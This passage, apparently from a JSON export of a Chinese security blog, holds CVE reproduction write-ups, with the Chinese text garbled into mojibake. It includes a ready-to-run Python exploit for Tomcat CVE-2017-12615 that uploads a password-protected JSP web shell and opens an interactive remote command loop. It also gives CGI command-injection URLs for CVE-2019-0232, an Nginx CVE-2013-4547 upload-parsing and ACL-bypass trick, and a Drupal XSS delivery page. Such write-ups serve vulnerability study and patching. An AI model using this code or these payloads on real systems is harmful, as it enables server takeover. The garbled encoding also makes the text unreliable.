#éªŒè¯æ–‡ä»¶æ˜¯å¦ä¸Šä¼ æˆåŠŸ #response = requests.get(url2) #ä¸Šä¼ æ–‡ä»¶ def upload(url): try: response = requests.put(url+filename+'/',data=data) return 1 except Exception as e: print(\"[-] {0} è¿æ¥å¤±è´¥\".format(url)) return 0 def checking(url): try: #éªŒè¯æ–‡ä»¶æ˜¯å¦ä¸Šä¼ æˆåŠŸ response = requests.get(url+filename) #print(url+filename) if response.status_code == 200 and 'hello' in response.text: print('[+] {0} å­˜åœ¨CVE-2017-12615 Tomcat ä»»æ„æ–‡ä»¶è¯»å†™æ¼æ´'.format(url)) else: print('[-] {0} ä¸å­˜åœ¨CVE-2017-12615 Tomcat ä»»æ„æ–‡ä»¶è¯»å†™æ¼æ´'.format(url)) except Exception as e: #print(e) print(\"[-] {0} è¿æ¥å¤±è´¥\".format(url)) if options.FILE and os.path.exists(options.FILE): with open(options.FILE) as f: urls = f.readlines() #print(urls) for url in urls: url = str(url).replace(' ', '').replace('\\r', '').strip() if upload(url) == 1: checking(url) elif options.FILE and not os.path.exists(options.FILE): print('[-] {0} æ–‡ä»¶ä¸å­˜åœ¨'.format(options.FILE)) else: #ä¸Šä¼ é“¾æ¥ url = options.URL+':'+options.PORT if upload(url) == 1: checking(url) æµ‹è¯• python3 CVE-2017-15715-POC.py -u http://192.168.132.144 -p8080 python3 CVE_2017_12615.py -f IP.txt EXPä»£ç  #CVE-2017-12615 EXP __author__ = 'çº¸æœº' import requests import optparse import time parse = optparse.OptionParser(usage = 'python3 %prog [-h] [-u URL] [-p PORT]') parse.add_option('-u','--url',dest='URL',help='target url') parse.add_option('-p','--port',dest='PORT',help='target port[default:8080]',default='8080') options,args = parse.parse_args() #éªŒè¯å‚æ•°æ˜¯å¦å®Œæ•´ if not options.URL or not options.PORT: print('Usage:python3 CVE-2017-12615-POC.py [-u url] [-p port] ') exit('CVE-2017-12615-POC.py:error:missing a mandatory option(-u,-p).Use -h for basic and -hh for advanced help') url = options.URL+':'+options.PORT filename = '/backdoor.jsp' payload = filename+'?pwd=023&amp;i=' headers = {\"User-Agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0\"} #æœ¨é©¬ data = '''&lt;% if(\"023\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"i\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\"&lt;pre&gt;\"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\"&lt;/pre&gt;\"); } %&gt;''' #ä¸Šä¼ æœ¨é©¬æ–‡ä»¶ def upload(url): print('[*] ç›®æ ‡åœ°å€:'+url) try: respond = requests.put(url+filename+'/',headers=headers,data = data) #print(respond.status_code) if respond.status_code == 201 or respond.status_code == 204: #print('[*] ç›®æ ‡åœ°å€:'+url) print('[+] æœ¨é©¬ä¸Šä¼ æˆåŠŸ') except Exception as e: print('[-] ä¸Šä¼ å¤±è´¥') return 0 #å‘½ä»¤æ‰§è¡Œ def attack(url,cmd): try: respond = requests.get(url+payload+cmd) if respond.status_code == 200: print(str(respond.text).replace(\"&lt;pre&gt;\",\"\").replace(\"&lt;/pre&gt;\",\"\").strip()) except Exception as e: print('[-] å‘½ä»¤æ‰§è¡Œé”™è¯¯') if upload(url) == 0: exit() time.sleep(0.5) print('è¾“å…¥æ‰§è¡Œå‘½ä»¤(quité€€å‡º):') while(1): cmd = input('&gt;&gt;&gt;') if(cmd == 'quit'): break attack(url,cmd) æµ‹è¯• python3 CVE-2017-12615-EXP.py -u http://192.168.132.144 -p 35654 0x04 ä¿®å¤å»ºè®® è®¾ç½®conf/webxml æ–‡ä»¶çš„ readOnly å€¼ä¸º Ture æˆ–æ³¨é‡Šå‚æ•° ç¦ç”¨ PUT æ–¹æ³•å¹¶é‡å¯ tomcat æœåŠ¡ï¼ˆå¦‚æœç¦ç”¨ PUT æ–¹æ³•ï¼Œå¯¹äºä¾èµ–PUTæ–¹æ³•çš„åº”ç”¨ï¼Œå¯èƒ½å¯¼è‡´ä¸šåŠ¡å¤±æ•ˆã€‚ï¼‰ å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬ ä½¿ç”¨WAFäº§å“è¿›è¡Œé˜²å¾¡ å‚è€ƒæ–‡ç«  https://blog.csdn.net/weixin_45540609/article/details/119170419 https://www.cnblogs.com/rnss/p/13384127.html https://paper.seebug.org/399/","tags":["CVE"],"categories":["CVEæ¼æ´"]},{"title":"Tomcat è¿œç¨‹ä»£ç æ‰§è¡ŒCVE-2019-0232","path":"/2023/09/16/tomcat-yuan-cheng-dai-ma-zhi-xing/","content":"0x01 æ¼æ´æè¿°ï¼š 2019å¹´4æœˆ11æ—¥ï¼ŒApacheå®˜æ–¹å‘å¸ƒé€šå‘Šç§°å°†åœ¨æœ€æ–°ç‰ˆæœ¬ä¸­ä¿®å¤ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2019-0232ï¼‰ï¼Œç”±äºJREå°†å‘½ä»¤è¡Œå‚æ•°ä¼ é€’ç»™Windowsçš„æ–¹å¼å­˜åœ¨é”™è¯¯ï¼Œä¼šå¯¼è‡´CGI Servletå—åˆ°è¿œç¨‹æ‰§è¡Œä»£ç çš„æ”»å‡»ã€‚ è§¦å‘è¯¥æ¼æ´éœ€è¦åŒæ—¶æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š 1. ç³»ç»Ÿä¸ºWindows 2. å¯ç”¨äº†CGI Servletï¼ˆé»˜è®¤ä¸ºå…³é—­ï¼‰ 3. å¯ç”¨äº†enableCmdLineArgumentsï¼ˆTomcat 9.0.*åŠå®˜æ–¹æœªæ¥å‘å¸ƒç‰ˆæœ¬é»˜è®¤ä¸ºå…³é—­ï¼‰ å½±å“èŒƒå›´ Apache Tomcat 9.0.0.M1 to 9.0.17 Apache Tomcat 8.5.0 to 8.5.39 Apache Tomcat 7.0.0 to 7.0.93 0x02 æ¼æ´å¤ç°ï¼š æˆ‘çš„å¤ç°ç¯å¢ƒï¼š windows server 2008 R2 apache Tomcat 8.5.23 jdk 1.8 jdkå¯ä»¥å»å®˜ç½‘ä¸‹è½½ï¼Œtomcatä¸‹è½½åœ°å€ï¼šhttps://archive.apache.org/dist/tomcat/ ï¼ˆæœ€å¥½ä¸‹è½½binç›®å½•é‡Œçš„æ–‡ä»¶ï¼‰ ç„¶åå°±æ˜¯é…ç½®javaç¯å¢ƒå˜é‡ï¼Œå‚è€ƒhttps://www.runoob.com/java/java-environment-setup.html è§£å‹é…ç½®tomcatï¼Œè¿è¡Œstartup.bat,å¦‚æœè¿™é‡Œä¸èƒ½æ­£ç¡®å¼¹å‡ºå‘½ä»¤è¡Œçª—å£æ˜¾ç¤ºæœåŠ¡å™¨å·²è¿è¡Œï¼Œå¯èƒ½æ˜¯javaç¯å¢ƒå˜é‡é…ç½®æœ‰é—®é¢˜ï¼Œä¹Ÿå¯ä»¥åœ¨startup.batæœ€ååŠ ä¸€ä¸ªpauseè®©å‘½ä»¤è¡Œåœ¨æœ€åä¸å…³é—­ï¼Œçœ‹ä¸€ä¸‹æ˜¯å¦æœ‰æŠ¥é”™ä¿¡æ¯ ![image-20230723163651288](Tomcat è¿œç¨‹ä»£ç æ‰§è¡Œ\\image-20230723163651288.png) é…ç½®å¥½ä¹‹åï¼Œéœ€è¦ä¿®æ”¹ä¸€äº›tomcatçš„é…ç½®ï¼š 1ï¼‰conf/web.xml ä¸­å¯ç”¨CGIServletå’Œå¯ç”¨cgiçš„servlet-mapping æ³¨æ„è¿™é‡Œå¯èƒ½æœ‰äº›ç‰ˆæœ¬é‡Œçš„cgiPathPrefixçš„å€¼æ˜¯WEB-INF/cgiï¼Œéœ€è¦æ”¹ä¸€ä¸‹ä¸ºæˆ‘ä»¬åé¢åˆ›å»ºçš„WEB-INF/cgi-bin &lt;servlet&gt; &lt;servlet-name&gt;cgi&lt;/servlet-name&gt; &lt;servlet-class&gt;org.apache.catalina.servlets.CGIServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;cgiPathPrefix&lt;/param-name&gt; &lt;param-value&gt;WEB-INF/cgi-bin&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;enableCmdLineArguments&lt;/param-name&gt; &lt;param-value&gt;true&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;executable&lt;/param-name&gt; &lt;param-value&gt;&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;5&lt;/load-on-startup&gt; &lt;/servlet&gt; #å°†ä¸‹é¢çš„è¯­å¥çš„æ³¨é‡Šå»æ‰ &lt;servlet-mapping&gt; &lt;servlet-name&gt;cgi&lt;/servlet-name&gt; &lt;url-pattern&gt;/cgi-bin/*&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; 2ï¼‰ç„¶åä¿®æ”¹åœ¨conf/context.xmlä¸­çš„æ·»åŠ privileged=\"true\"è¯­å¥ ![image-20230723165728781](Tomcat è¿œç¨‹ä»£ç æ‰§è¡Œ\\image-20230723165728781.png) 3ï¼‰ç„¶ååœ¨ ROOT\\WEB-INF ä¸‹åˆ›å»º cgi-bin ç›®å½•, å¹¶åœ¨è¯¥ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªå†…å®¹ä¸º echo Content-type: text/html çš„ .bat æ–‡ä»¶ã€‚ Copyä¾‹ï¼šhello.bat @echo off echo Content-Type: text/plain echo. set foo=%~1 %foo% ![image-20230723165809873](Tomcat è¿œç¨‹ä»£ç æ‰§è¡Œ\\image-20230723165809873.png) æˆåŠŸè®¿é—® æ¼æ´åˆ©ç”¨ è®¿é—®http://127.0.0.1:8080/cgi-bin/lxhsec.bat?&amp;dir ![image-20230723172844447](Tomcat è¿œç¨‹ä»£ç æ‰§è¡Œ\\image-20230723172844447.png) æ‰§è¡Œå‘½ä»¤http://127.0.0.1:8080/cgi-bin/lxhsec.bat?&amp;C:/WINDOWS/system32/net+user ![image-20230723172916863](Tomcat è¿œç¨‹ä»£ç æ‰§è¡Œ\\image-20230723172916863.png) 2.æŠŠåé¢çš„å‘½ä»¤ä¿®æ”¹æˆcalc.exeå¼¹å‡ºè®¡ç®—å™¨ï¼šhttp://localhost:8080/cgi-bin/hello.bat?&amp;C%3A\\Windows\\System32\\calc.exe ![image-20230723172951240](Tomcat è¿œç¨‹ä»£ç æ‰§è¡Œ\\image-20230723172951240.png) æ¼æ´åŸç†å…·ä½“åˆ†æ å‚è€ƒï¼šhttps://xz.aliyun.com/t/4875 Note:netå‘½ä»¤çš„è·¯å¾„è¦å†™å…¨ï¼Œç›´æ¥å†™net userï¼ŒTomcatæ§åˆ¶å°ä¼šæç¤ºnetä¸æ˜¯å†…éƒ¨å‘½ä»¤ï¼Œä¹Ÿä¸æ˜¯å¯è¿è¡Œçš„ç¨‹åºï¼Œå¦ å¿…é¡»ä½¿ç”¨+å·è¿æ¥ï¼Œä½¿ç”¨ç©ºæ ¼ï¼Œ%2Béƒ½ä¼šæ‰§è¡Œå¤±è´¥ï¼Œæ§åˆ¶å°æŠ¥é”™ã€‚ 0x03 ä¿®å¤å»ºè®® è¿™ä¸ªé»˜è®¤æ˜¯å…³é—­çš„ï¼Œå¦‚æœæ‰“å¼€äº†è¯·å…³é—­ï¼Œè‹¥éœ€ä½¿ç”¨è¯·å‡çº§ç‰ˆæœ¬ã€‚","tags":["CVE"],"categories":["CVEæ¼æ´"]},{"title":"Nginx-æ–‡ä»¶åé€»è¾‘æ¼æ´CVE-2013-4547","path":"/2023/09/16/nginx-wen-jian-ming-luo-ji-lou-dong/","content":"0x01 æ¼æ´æè¿°ï¼š è¿™ä¸ªæ¼æ´å…¶å®å’Œä»£ç æ‰§è¡Œæ²¡æœ‰å¤ªå¤§çš„å…³ç³»,ä¸»è¦åŸå› æ˜¯é”™è¯¯åœ°è§£æäº†è¯·æ±‚çš„URL,é”™è¯¯åœ°è·å–åˆ°ç”¨æˆ·è¯·æ±‚çš„æ–‡ä»¶åï¼Œå¯¼è‡´å‡ºç°æƒé™ç»•è¿‡ã€ä»£ç æ‰§è¡Œçš„è¿å¸¦å½±å“ã€‚ å½±å“ç‰ˆæœ¬ï¼šNginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7 0x02 æ¼æ´åŸç†ï¼š ä¸¾ä¸ªä¾‹å­,æ¯”å¦‚,nginxåŒ¹é…åˆ°.phpç»“å°¾çš„è¯·æ±‚,å°±å‘é€ç»™fastcgiè¿›è¡Œè§£æ,å¸¸è§çš„å†™æ³•å¦‚ä¸‹: location ~ \\.php$ { include fastcgi_params; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /var/www/html$fastcgi_script_name; fastcgi_param DOCUMENT_ROOT /var/www/html; } æ­£å¸¸æƒ…å†µä¸‹(å…³é—­äº†pathinfoçš„æƒ…å†µä¸‹),åªæœ‰.phpåç¼€çš„æ–‡ä»¶æ‰ä¼šè¢«å‘é€ç»™fastcgiè§£æã€‚ è€Œå­˜åœ¨CVE-2013-4547çš„æƒ…å†µä¸‹,æˆ‘ä»¬è¯·æ±‚1.gif[0x20][0x00].phpï¼Œè¿™ä¸ªURIå¯ä»¥åŒ¹é…ä¸Šæ­£åˆ™.php$,å¯ä»¥è¿›å…¥è¿™ä¸ªLocationå—ï¼›ä½†è¿›å…¥å,Nginxå´é”™è¯¯åœ°è®¤ä¸ºè¯·æ±‚çš„æ–‡ä»¶æ˜¯1.gif[0x20],å°±è®¾ç½®å…¶ä¸ºSCRIPT_FILENAMEçš„å€¼å‘é€ç»™fastcgiã€‚ Fastcgiæ ¹æ®SCRIPT_FILENAMEçš„å€¼è¿›è¡Œè§£æ,æœ€åé€ æˆäº†è§£ææ¼æ´ã€‚ æ‰€ä»¥,æˆ‘ä»¬åªéœ€è¦ä¸Šä¼ ä¸€ä¸ªç©ºæ ¼ç»“å°¾çš„æ–‡ä»¶,å³å¯ä½¿PHPè§£æä¹‹ã€‚ å†ä¸¾ä¸ªä¾‹å­,æ¯”å¦‚å¾ˆå¤šç½‘ç«™é™åˆ¶äº†å…è®¸è®¿é—®åå°çš„IP: location /admin/ { allow 127.0.0.1; deny all; } æˆ‘ä»¬å¯ä»¥è¯·æ±‚å¦‚ä¸‹URI:/test[0x20]/â€¦/admin/index.php,è¿™ä¸ªURIä¸ä¼šåŒ¹é…ä¸Šlocationåé¢çš„/admin/,ä¹Ÿå°±ç»•è¿‡äº†å…¶ä¸­çš„IPéªŒè¯;ä½†æœ€åè¯·æ±‚çš„æ˜¯/test[0x20]/â€¦/admin/index.phpæ–‡ä»¶,ä¹Ÿå°±æ˜¯/admin/index.php,æˆåŠŸè®¿é—®åˆ°åå°ã€‚(è¿™ä¸ªå‰ææ˜¯éœ€è¦æœ‰ä¸€ä¸ªç›®å½•test:è¿™æ˜¯Linuxç³»ç»Ÿçš„ç‰¹ç‚¹,å¦‚æœæœ‰ä¸€ä¸ªä¸å­˜åœ¨çš„ç›®å½•,åˆ™å³ä½¿è·³è½¬åˆ°ä¸Šä¸€å±‚,ä¹Ÿä¼šçˆ†æ–‡ä»¶ä¸å­˜åœ¨çš„é”™è¯¯,Windowsä¸‹æ²¡æœ‰è¿™ä¸ªé™åˆ¶) 0x03 å¤ç°è¿‡ç¨‹ åœ¨Windowså¼„äº†ä¸ªç¯å¢ƒï¼Œåæ¥å‘ç°è¦æ–‡ä»¶åçš„åé¢å­˜åœ¨ç©ºæ ¼ï¼Œè€ŒWindowsæ˜¯ä¸å…è®¸å­˜åœ¨æ­¤ç±»æ–‡ä»¶çš„ï¼Œå› æ­¤è¿™é‡Œå¤ç°ï¼Œä½¿ç”¨Vulhubçš„dockerè¿›è¡Œå¤ç°ã€‚ è®¿é—®http://your-ip:8080/ ä¸Šä¼ æ–‡ä»¶ çœ‹ä¸€ä¸‹åç«¯è¿‡æ»¤ ç®€å•æ˜äº†çš„é»‘åå• è®¿é—®http://your-ip:8080/ ä¸Šä¼ æ–‡ä»¶ï¼Œåœ¨jpgåé¢åŠ ä¸ªç©ºæ ¼ï¼Œæ˜¯çš„ä¸Šä¼ çš„æ–‡ä»¶åå«åš1.jpg[ç©ºæ ¼] è®¿é—®http://your-ip:8080/uploadfiles/1.jpg .php, å¹¶æŠ“åŒ…ï¼Œä¿®æ”¹ä¸º1.jpg...php, åœ¨Hexé€‰ä¿®å¡ä¸­å°†jpgåé¢çš„ä¸¤ä¸ªç‚¹2eæ”¹æˆ20,00 ç‚¹å‡»Go,å¦‚ä¸‹ã€‚ æ³¨æ„ï¼Œ[0x20]æ˜¯ç©ºæ ¼ï¼Œ[0x00]æ˜¯\\0ï¼Œè¿™ä¸¤ä¸ªå­—ç¬¦éƒ½ä¸éœ€è¦ç¼–ç ã€‚ Note:è¯¥æ¼æ´ä¸å—cgi.fix_pathinfoå½±å“ï¼Œå½“å…¶ä¸º0æ—¶ï¼Œä¾æ—§è§£æï¼Œåœ¨Windowsä¸Šæœ‰æ‰€é™åˆ¶ã€‚ 0x04 ä¿®å¤å»ºè®® 1ï¼‰è®¾ç½®security.limit_extensions = .php 2ï¼‰æˆ–å‡çº§Nginx","tags":["CVE"],"categories":["CVEæ¼æ´"]},{"title":"Drupal XSSæ¼æ´ï¼ˆCVE-2019-6341ï¼‰","path":"/2023/09/16/drupal-xss-lou-dong-cve-2019-6341/","content":"0x01-æ¼æ´æ¦‚è¿° å½±å“è½¯ä»¶ï¼šDrupal æ–¹å¼ï¼šé€šè¿‡æ–‡ä»¶æ¨¡å—æˆ–è€…å­ç³»ç»Ÿä¸Šä¼ æ¶æ„æ–‡ä»¶è§¦å‘XSSæ¼æ´ å‚è€ƒé“¾æ¥ï¼šDrupal 1-click to RCE åˆ†æ æ•ˆæœï¼šJSä»£ç æ‰§è¡Œï¼ˆCookies èµ„æ–™çªƒå–ã€ä¼šè¯åŠ«æŒã€é’“é±¼æ¬ºéª—ã€ç½‘é¡µæŒ‚é©¬ç­‰ï¼‰ 0x02-æ¼æ´ç¯å¢ƒ æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å¯åŠ¨drupal 8.5.0çš„ç¯å¢ƒï¼š docker-compose up -d ç¯å¢ƒå¯åŠ¨åï¼Œè®¿é—® http://your-ip:8080/ å°†ä¼šçœ‹åˆ°drupalçš„å®‰è£…é¡µé¢ï¼Œä¸€è·¯é»˜è®¤é…ç½®ä¸‹ä¸€æ­¥å®‰è£…ã€‚å› ä¸ºæ²¡æœ‰mysqlç¯å¢ƒï¼Œæ‰€ä»¥å®‰è£…çš„æ—¶å€™å¯ä»¥é€‰æ‹©sqliteæ•°æ®åº“ã€‚ 0x03-Drupalèµ„æ–™ GPTå›ç­”: Drupalæ˜¯ä¸€ç§ç‹¬ç«‹å¼€æºçš„å†…å®¹ç®¡ç†ç³»ç»Ÿï¼ˆContent Management Systemï¼Œç®€ç§°CMSï¼‰ã€‚å®ƒæ˜¯ç”¨PHPç¼–ç¨‹è¯­è¨€å¼€å‘çš„ï¼Œå¹¶ä½¿ç”¨MySQLæˆ–PostgreSQLæ•°æ®åº“è¿›å…¥æ•°æ®å­˜å‚¨ã€‚Drupalæä¾›äº†ä¸€å¥—åŠŸèƒ½å¼ºå¤§å’Œçµæ´»çš„å·¥å…·ï¼Œç”¨äºæ„å»ºå’Œç®¡ç†ç½‘ç«™ã€åšå®¢ã€ç¤¾åŒºç½‘ç«™ã€ç”µå­å•†åŠ¡å¹³å°å’Œå…¶ä»–å„ç§åœ¨çº¿åº”ç”¨ã€‚ Drupalæä¾›äº†è®¸è®¸å¤šå¤šçš„åŠŸèƒ½å’Œæ¨¡å—ï¼Œä½¿ç”¨ç”¨æˆ·è¶³å¤Ÿçš„åˆ›å»ºå’Œç®¡ç†å„ç§ç±»å‹çš„å†…å®¹ï¼ŒåŒ…æ‹¬æ–‡ç« ã€é¡µé¢ã€å›¾åƒã€å¤šåª’ä½“æ–‡ä»¶å’Œç”¨æˆ·å¸æˆ·ã€‚å®ƒè¿˜å…·æœ‰å¼ºå¤§çš„ç”¨æˆ·è§’è‰²å’Œæƒé™ç®¡ç†ç³»ç»Ÿï¼Œä½¿ç½‘ç«™ç®¡ç†äººå‘˜è¶³å¤Ÿå¯¹ä¸åŒçš„ç”¨æˆ·ç»™äºˆä¸åŒçš„è®¿é—®æƒé™ã€‚ Drupalçš„ä¸»è¦ä¼˜ç‚¹ä¹‹ä¸€æ˜¯å…¶çµæ€§å’Œå¯æ‰©å±•æ€§ã€‚å®ƒæ‹¥æœ‰ä¸€ä¸ªå¾ˆå¤§çš„ç¤¾åŒºï¼Œæä¾›äº†æ•°ä»¥åƒè®¡çš„æ¨¡å—å’Œä¸»é¢˜ï¼Œå¯ä»¥æ ¹æ®ä¸åŒçš„éœ€æ±‚å’Œè¦æ±‚è¿›è¡Œå®šåˆ¶ã€‚è¿™ä½¿Drupalæˆä¸ºä¸€ä¸ªéå¸¸å¼ºå¤§çš„å’Œé€‚åˆæ€§èƒ½å¼ºçš„å¹³å°ï¼Œå¯ä»¥ç”¨äºæ„å»ºå„ç§æ¨¡æ¿å’Œç±»å‹çš„ç½‘ç«™ã€‚ æ€»çš„æ¥è¯´ï¼ŒDrupalæ˜¯ä¸€ç§åŠŸèƒ½å¼ºå¤§ã€çµé­‚æ´»åŠ¨å’Œå¯æ‰©å±•çš„å¼€æºå†…éƒ¨ç®¡ç†ç³»ç»Ÿï¼Œç”¨äºæ„å»ºå’Œç®¡ç†å„ç§ç±»å‹çš„ç½‘ç«™å’Œåœ¨çº¿åº”ç”¨ã€‚ ä½•ä¸ºå†…å®¹ç®¡ç†ç³»ç»Ÿ(CMS): å†…å®¹ç®¡ç†ç³»ç»Ÿï¼ˆContent Management Systemï¼ŒCMSï¼‰å¯ä»¥ç”¨æ¥ç®¡ç†ã€ç»„ç»‡å’Œå‘å¸ƒå„ç§ç±»å‹çš„å†…å®¹ã€‚å®ƒæä¾›äº†ä¸€å¥—å·¥å…·å’ŒåŠŸèƒ½ï¼Œä½¿ç”¨æˆ·èƒ½å¤Ÿè½»æ¾åˆ›å»ºã€ç¼–è¾‘ã€å­˜å‚¨å’Œåˆ†å‘å†…å®¹ï¼Œè€Œæ— éœ€ç¼–å†™ä»£ç æˆ–å…·å¤‡æ·±å…¥çš„æŠ€æœ¯çŸ¥è¯†ã€‚ 0x04-æ¼æ´åŸç† 3.1 æ— åç¼€æ–‡ä»¶å†™å…¥ åœ¨Drupalçš„æœºåˆ¶ä¸­ï¼Œè®¾å®šäº†è¿™æ ·ä¸€æ¡è§„åˆ™ã€‚ ç”¨æˆ·ä¸Šä¼ çš„å›¾ç‰‡æ–‡ä»¶åå°†ä¼šè¢«ä¿ç•™ï¼Œå¦‚æœå‡ºç°æ–‡ä»¶åç›¸åŒçš„æƒ…å†µï¼Œé‚£ä¹ˆæ–‡ä»¶ååé¢å°±ä¼šè¢«è·Ÿä¸Š_0,_1ä¾æ¬¡é€’å¢ã€‚ åœ¨Drupalä¸­ä¸ºäº†å…¼å®¹å„ç§ç¼–ç ï¼Œåœ¨å¤„ç†ä¸Šä¼ æ–‡ä»¶åæ—¶ï¼ŒDrupalä¼šå¯¹æ–‡ä»¶åå¯¹ç›¸åº”çš„å¤„ç†ï¼Œå¦‚æœå‡ºç°å€¼å°äº0x20çš„å­—ç¬¦ï¼Œé‚£ä¹ˆå°±ä¼šå°†å…¶è½¬åŒ–ä¸º_ã€‚ ![image-20230615205051359](Drupal XSSæ¼æ´ï¼ˆCVE-2019-6341ï¼‰\\image-20230615205051359.png) ä½†å¦‚æœæ–‡ä»¶åä¸­ï¼Œå¦‚æœå‡ºç°äº†\\x80åˆ°\\xffçš„å­—ç¬¦æ—¶ï¼ŒPHPå°±ä¼šæŠ›å‡ºPREG_BAD_UTF8_ERRORï¼Œå¦‚æœå‘ç”Ÿé”™è¯¯ï¼Œé‚£ä¹ˆpreg_replaceå°±ä¼šè¿”å›NULLï¼Œ$basenameå°±ä¼šè¢«ç½®ä¸ºNULLã€‚ ![image-20230615205106915](Drupal XSSæ¼æ´ï¼ˆCVE-2019-6341ï¼‰\\image-20230615205106915.png) å½“basenameä¸ºç©ºæ—¶ï¼Œåé¢çš„æ–‡ä»¶å†…å®¹ä¼šè¢«å†™å…¥åˆ°å½¢ä¼¼_0çš„æ–‡ä»¶å†… ![image-20230615205120047](Drupal XSSæ¼æ´ï¼ˆCVE-2019-6341ï¼‰\\image-20230615205120047.png) åœ¨è¿™ä¸ªåŸºç¡€ä¸‹ï¼ŒåŸæœ¬ä¼šè¢«ä¸Šä¼ åˆ° /sites/default/files/pictures/&lt;YYYY-MM&gt;/ åˆ™ä¼šè¢«å†™å…¥ /sites/default/files/pictures/&lt;YYYY-MM&gt;/_0 å½“æœåŠ¡ç«¯å¼€å¯äº†è¯„è®ºå¤´åƒä¸Šä¼ ï¼Œæˆ–è€…æ˜¯æ‹¥æœ‰ä½œè€…è´¦å·æ—¶ æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ä¸€å¼ æ¶æ„æ„é€ çš„gifå›¾ï¼Œç„¶åå†ä¸Šä¼ ä¸€å¼ å¸¦æœ‰æ¶æ„å­—ç¬¦çš„åŒä¸€å¼ å›¾ï¼Œé‚£ä¹ˆå°±ä¼šå°†æ¶æ„å›¾ç‰‡çš„å†…å®¹å†™å…¥åˆ°ç›¸åº”ç›®å½•çš„_0ä¸­ ![image-20230615210437063](Drupal XSSæ¼æ´ï¼ˆCVE-2019-6341ï¼‰\\image-20230615210437063.png) ä½†å¦‚æœæˆ‘ä»¬ç›´æ¥è®¿é—®è¿™ä¸ªæ–‡ä»¶æ—¶ï¼Œè¯¥æ–‡ä»¶å¯èƒ½ä¸ä¼šè§£æï¼Œè¿™æ˜¯å› ä¸º æµè§ˆå™¨é¦–å…ˆä¼šæ ¹æ®æœåŠ¡ç«¯ç»™å‡ºçš„content-typeè§£æé¡µé¢ï¼Œè€ŒæœåŠ¡ç«¯ä¸€èˆ¬ä¸ä¼šç»™ç©ºåç¼€çš„æ–‡ä»¶è®¾ç½®content-typeï¼Œæˆ–è€…è®¾ç½®ä¸ºapplication/octet-stream å…¶æ¬¡æµè§ˆå™¨ä¼šæ ¹æ®æ–‡ä»¶å†…å®¹åšç®€å•çš„åˆ¤æ–­ï¼Œå¦‚æœæ–‡ä»¶çš„å¼€å¤´ä¸º&lt;html&gt;ï¼Œåˆ™éƒ¨åˆ†æµè§ˆå™¨ä¼šå°†å…¶è§£æä¸ºhtml éƒ¨åˆ†æµè§ˆå™¨è¿˜å¯èƒ½ä¼šè®¾ç½®é»˜è®¤çš„content-typeï¼Œä½†å¤§éƒ¨åˆ†æµè§ˆå™¨ä¼šé€‰æ‹©ä¸è§£æè¯¥æ–‡ä»¶ã€‚ è¿™æ—¶å€™æˆ‘ä»¬å°±éœ€è¦ä¸€ä¸ªå¾ˆç‰¹æ®Šçš„å°trickäº†ï¼Œaæ ‡ç­¾å¯ä»¥è®¾ç½®æ‰“å¼€æ–‡ä»¶çš„type(only not for chrome) å½“ä½ è®¿é—®è¯¥é¡µé¢æ—¶ï¼Œé¡µé¢ä¼šè¢«è§£æä¸ºhtmlå¹¶æ‰§è¡Œç›¸åº”çš„ä»£ç ã€‚ &lt;html&gt; &lt;head&gt; &lt;/head&gt; &lt;body&gt; &lt;a id='a' href=\"http://127.0.0.1/drupal-8.6.2/sites/default/files/2019-04/_6\" type=\"text/html\"&gt;321321&lt;/a&gt; &lt;script type=\"text/javascript\"&gt; var a = document.getElementById('a') a.click() &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; å½“è¢«æ”»å‡»è€…è®¿é—®è¯¥é¡µé¢æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œä»»æ„çš„xssï¼Œè¿™ä¸ºåç»­çš„åˆ©ç”¨å¸¦æ¥äº†å¾ˆå¤§çš„ä¾¿åˆ©ï¼Œæˆ‘ä»¬æœ‰äº†ä¸€ä¸ªåŒæºç¯å¢ƒä¸‹çš„ä»»æ„jsæ‰§è¡Œç‚¹ï¼Œè®©æˆ‘ä»¬ç»§ç»­çœ‹ã€‚ 0x05-æ¼æ´å¤ç° è¯¥æ¼æ´éœ€è¦åˆ©ç”¨drupalæ–‡ä»¶æ¨¡å—ä¸Šä¼ æ–‡ä»¶çš„æ¼æ´ï¼Œä¼ªé€ ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶ï¼Œä¸Šä¼ ï¼Œæ–‡ä»¶çš„å†…å®¹å®é™…æ˜¯ä¸€æ®µHTMLä»£ç ï¼Œå†…åµŒJSï¼Œè¿™æ ·å…¶ä»–ç”¨æˆ·åœ¨è®¿é—®è¿™ä¸ªé“¾æ¥æ—¶ï¼Œå°±å¯èƒ½è§¦å‘XSSæ¼æ´ã€‚ Drupal çš„å›¾ç‰‡é»˜è®¤å­˜å‚¨ä½ç½®ä¸º /sites/default/files/pictures/&lt;YYYY-MM&gt;/ï¼Œé»˜è®¤å­˜å‚¨åç§°ä¸ºå…¶åŸæ¥çš„åç§°ï¼Œæ‰€ä»¥ä¹‹ååœ¨åˆ©ç”¨æ¼æ´æ—¶ï¼Œå¯ä»¥çŸ¥é“ä¸Šä¼ åçš„å›¾ç‰‡çš„å…·ä½“ä½ç½®ã€‚ ä½¿ç”¨PoCä¸Šä¼ æ„é€ å¥½çš„ä¼ªé€ GIFæ–‡ä»¶ï¼ŒPoCå‚è€ƒthezdi/PoCçš„PoCã€‚ 